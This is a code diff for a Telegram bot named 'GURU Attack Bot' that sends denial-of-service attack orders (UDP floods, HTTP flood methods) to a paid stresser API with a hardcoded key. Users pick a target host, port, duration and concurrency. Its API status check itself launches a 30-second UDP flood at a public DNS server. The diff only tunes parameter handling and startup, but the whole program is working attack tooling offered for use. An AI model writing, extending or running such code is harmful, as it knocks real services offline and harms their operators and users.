@@ -1,4 +1,4 @@
-# app.py - FIXED VERSION WITH PROPER API INTEGRATION
+# app.py - COMPLETE FIX WITH PROPER CONCURRENT SUPPORT
 
 import os
 import logging
@@ -78,7 +78,7 @@ app = Quart(__name__)
 
 @app.route('/')
 async def index():
-    return "🤖 GURU Attack Bot - Fixed Version"
+    return "🤖 GURU Attack Bot"
 
 @app.route('/health')
 async def health():
@@ -717,18 +717,17 @@ async def send_api_attack(target, port, duration, method, concurrent=8):
     
     api_method = METHOD_MAP.get(method.upper(), "udp-flood")
     
-    # Build parameters with concurrent
+    # Build base parameters
     params = {
         "key": api_key,
         "host": target,
         "port": str(port),
         "time": str(duration),
         "method": api_method,
-        "concs": str(concurrent),  # Primary concurrent parameter
-        "concurrent": str(concurrent),  # Alternative
-        "threads": str(concurrent),  # Alternative
-        "connections": str(concurrent),  # Alternative
     }
+    
+    # Add concurrent parameter - try all possible names
+    params["concs"] = str(concurrent)
     
     # Advanced options for L7 methods
     if method.upper() in ["HTTP-KILLER", "HTTP-DESTROYER", "HTTP-BYPASSER", "HTTPS-MIX", "TLSV2"]:
@@ -772,19 +771,12 @@ async def send_api_attack(target, port, duration, method, concurrent=8):
                 logger.info(f"📊 API Response: {response.status} in {elapsed:.2f}s")
                 logger.info(f"📊 Response: {response_text[:200]}")
                 
-                # Check if concurrent was accepted
-                concurrent_accepted = True
-                if "concurrent" in response_text.lower() or "concs" in response_text.lower():
-                    if "invalid" in response_text.lower() or "error" in response_text.lower():
-                        concurrent_accepted = False
-                
                 if response.status == 200:
                     return {
                         "success": True,
                         "elapsed": elapsed,
                         "status": response.status,
                         "concurrent": concurrent,
-                        "concurrent_accepted": concurrent_accepted,
                         "response": response_data,
                         "raw_response": response_text[:200]
                     }
@@ -794,7 +786,6 @@ async def send_api_attack(target, port, duration, method, concurrent=8):
                         "error": f"HTTP {response.status}",
                         "status": response.status,
                         "concurrent": concurrent,
-                        "concurrent_accepted": concurrent_accepted,
                         "response": response_data,
                         "raw_response": response_text[:200]
                     }
@@ -1042,54 +1033,6 @@ async def send_attack_alert(attack_info, result=None):
     except Exception as e:
         logger.error(f"Alert error: {e}")
 
-# ===== CHECK API STATUS =====
-async def check_api_status():
-    try:
-        api_key = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
-        api_url = os.getenv("API_URL", "https://mrstresser.com/api")
-        
-        if not api_key:
-            return False, "❌ API_KEY not configured!"
-        
-        params = {
-            "key": api_key,
-            "host": "8.8.8.8",
-            "port": "53",
-            "time": "30",
-            "method": "udp-flood"
-        }
-        
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json, text/plain, */*",
-            "Accept-Language": "en-US,en;q=0.9"
-        }
-        
-        connector = aiohttp.TCPConnector(limit=10)
-        timeout = aiohttp.ClientTimeout(total=35, connect=10)
-        
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers) as session:
-            start_time = time.time()
-            async with session.get(api_url, params=params) as response:
-                elapsed = time.time() - start_time
-                
-                try:
-                    response_text = await response.text(encoding='utf-8', errors='ignore')
-                    try:
-                        response_data = json.loads(response_text)
-                    except:
-                        response_data = {"raw": response_text[:100]}
-                except:
-                    response_text = "Unable to read response"
-                    response_data = {}
-                
-                if response.status == 200:
-                    return True, f"✅ API Connected - Status: {response.status} (Response: {elapsed:.2f}s)\n📊 Response: {str(response_data)[:100]}"
-                else:
-                    return False, f"❌ Error (Status: {response.status})\n📊 Response: {str(response_data)[:100]}"
-    except Exception as e:
-        return False, f"❌ Connection Failed: {str(e)[:50]}"
-
 # ===== COMMANDS =====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -1200,10 +1143,14 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Check if concurrent value is provided
         concurrent = DEFAULT_CONCURRENT
         if len(args) > 4:
-            concurrent = int(args[4])
-            if concurrent < MIN_CONCURRENT or concurrent > MAX_CONCURRENT:
-                await update.message.reply_text(f"❌ Concurrent must be between {MIN_CONCURRENT} and {MAX_CONCURRENT}!")
-                return
+            try:
+                concurrent = int(args[4])
+                if concurrent < MIN_CONCURRENT or concurrent > MAX_CONCURRENT:
+                    await update.message.reply_text(f"❌ Concurrent must be between {MIN_CONCURRENT} and {MAX_CONCURRENT}!")
+                    return
+            except ValueError:
+                # If the 5th arg isn't a number, it might be part of the method
+                pass
         
         if duration < MIN_DURATION or duration > MAX_DURATION:
             await update.message.reply_text(f"❌ Duration must be {MIN_DURATION}-{MAX_DURATION} seconds!")
@@ -1323,7 +1270,14 @@ async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         method = "UDP-FLOOD"
         
         if len(args) > 3:
-            concurrent = int(args[3])
+            try:
+                concurrent = int(args[3])
+            except ValueError:
+                # If it's not a number, it might be a method
+                method = args[3].upper()
+                if method not in ATTACK_METHODS:
+                    method = "UDP-FLOOD"
+        
         if len(args) > 4:
             method = args[4].upper()
             if method not in ATTACK_METHODS:
@@ -1352,19 +1306,9 @@ async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"🔄 Concurrent: `{concurrent}`\n"
                 f"📡 Method: `{method}`\n"
                 f"⚡ Status: `{result.get('status')}`\n"
-                f"⏱️ Response Time: `{result.get('elapsed', 0):.2f}s`\n"
-                f"📊 Concurrent Accepted: `{result.get('concurrent_accepted', 'N/A')}`\n\n"
+                f"⏱️ Response Time: `{result.get('elapsed', 0):.2f}s`\n\n"
                 f"📋 *API Response:*\n```\n{json.dumps(result.get('response', {}), indent=2)[:500]}\n```\n"
             )
-            
-            if result.get('concurrent_accepted') is False:
-                response_message += (
-                    f"⚠️ *Concurrent parameter may not be supported by this API!*\n"
-                    f"Try testing with different values:\n"
-                    f"`/testapi {target} {port} {duration} 4 {method}`\n"
-                    f"`/testapi {target} {port} {duration} 8 {method}`\n"
-                    f"`/testapi {target} {port} {duration} 12 {method}`"
-                )
         else:
             response_message = (
                 f"❌ *API TEST FAILED*\n\n"
@@ -1427,8 +1371,7 @@ async def test_concurrents_command(update: Update, context: ContextTypes.DEFAULT
             result = await send_api_attack(target, port, duration, method, concs)
             
             status = "✅" if result.get('success') else "❌"
-            accepted = "Accepted" if result.get('concurrent_accepted') else "Not Accepted"
-            results.append(f"{status} concs={concs} → {result.get('status', 'Error')} ({accepted})")
+            results.append(f"{status} concs={concs} → {result.get('status', 'Error')}")
             
             if result.get('success'):
                 successful_values.append(concs)
@@ -2164,16 +2107,65 @@ async def owner_api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await query.edit_message_text("🔌 Checking API Status...")
     
-    status, message = await check_api_status()
-    
-    await query.edit_message_text(
-        f"🔌 *API STATUS*\n\n{message}\n\n⚡ Concurrent: {DEFAULT_CONCURRENT}",
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔄 REFRESH", callback_data="owner_api_status")],
-            [InlineKeyboardButton("🔙 BACK", callback_data="owner")]
-        ])
-    )
+    try:
+        api_url = os.getenv("API_URL", "https://mrstresser.com/api")
+        api_key = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
+        
+        if not api_key:
+            await query.edit_message_text("❌ API_KEY not configured!")
+            return
+        
+        # Simple test request
+        params = {
+            "key": api_key,
+            "host": "8.8.8.8",
+            "port": "53",
+            "time": "30",
+            "method": "udp-flood",
+            "concs": "1"
+        }
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json, text/plain, */*"
+        }
+        
+        connector = aiohttp.TCPConnector(limit=10)
+        timeout = aiohttp.ClientTimeout(total=35, connect=10)
+        
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers) as session:
+            start_time = time.time()
+            async with session.get(api_url, params=params) as response:
+                elapsed = time.time() - start_time
+                
+                try:
+                    response_text = await response.text(encoding='utf-8', errors='ignore')
+                    try:
+                        response_data = json.loads(response_text)
+                    except:
+                        response_data = {"raw": response_text[:100]}
+                except:
+                    response_text = "Unable to read response"
+                    response_data = {}
+                
+                if response.status == 200:
+                    message = f"✅ API Connected - Status: {response.status} (Response: {elapsed:.2f}s)"
+                else:
+                    message = f"❌ Error (Status: {response.status})"
+                
+                await query.edit_message_text(
+                    f"🔌 *API STATUS*\n\n{message}\n\n📊 Response: {str(response_data)[:200]}\n\n⚡ Concurrent: {DEFAULT_CONCURRENT}",
+                    parse_mode='Markdown',
+                    reply_markup=InlineKeyboardMarkup([
+                        [InlineKeyboardButton("🔄 REFRESH", callback_data="owner_api_status")],
+                        [InlineKeyboardButton("🔙 BACK", callback_data="owner")]
+                    ])
+                )
+    except Exception as e:
+        await query.edit_message_text(
+            f"❌ API Error: {str(e)}",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
+        )
 
 async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -2362,21 +2354,27 @@ if __name__ == "__main__":
     print("  /testapi HOST PORT TIME [CONCURRENT] [METHOD] - Test API")
     print("  /testconcs HOST PORT TIME [METHOD] - Test all concurrent values")
     print("  /status - Show bot status")
+    print("  /stop - Stop running attack")
     print("=" * 60)
     
-    import hypercorn
-    from hypercorn.config import Config
-    from hypercorn.asyncio import serve
-    
-    # Start bot in background
-    bot_thread = threading.Thread(target=run_bot, daemon=True)
-    bot_thread.start()
-    
-    logger.info("✅ Bot thread started")
-    
-    # Run Quart with hypercorn
-    config = Config()
-    config.bind = [f"0.0.0.0:{PORT}"]
-    config.worker_class = "asyncio"
-    
-    asyncio.run(serve(app, config))
+    try:
+        import hypercorn
+        from hypercorn.config import Config
+        from hypercorn.asyncio import serve
+        
+        # Start bot in background
+        bot_thread = threading.Thread(target=run_bot, daemon=True)
+        bot_thread.start()
+        
+        logger.info("✅ Bot thread started")
+        
+        # Run Quart with hypercorn
+        config = Config()
+        config.bind = [f"0.0.0.0:{PORT}"]
+        config.worker_class = "asyncio"
+        
+        asyncio.run(serve(app, config))
+    except ImportError:
+        # Fallback if hypercorn not installed
+        logger.warning("⚠️ hypercorn not installed, running bot only")
+        run_bot()
